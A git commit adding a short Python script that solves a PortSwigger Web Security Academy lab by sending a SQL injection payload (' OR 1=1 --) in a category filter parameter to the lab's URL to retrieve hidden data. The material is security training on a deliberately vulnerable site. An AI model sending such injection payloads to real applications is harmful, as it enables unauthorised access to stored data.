18fee5f92bf3a30a0e6e291815f3c6a4b0bf19f2
D4rU_Li3b3rt <122429060+khacminh03@users.noreply.github.com>
2025-04-14 23:56:35 -0400

    Add files via upload

---
+++ portswigger/WHERE-clause-allowing-retrieval-of-hidden-data.py
@@ -0,0 +1,4 @@
+import requests
+url = """https://0a24005904ac1cc380e11c4800330083.web-security-academy.net/filter?category=Accessories' OR 1=1 --"""
+response = requests.get(url=url)
+print("your solve the lab")
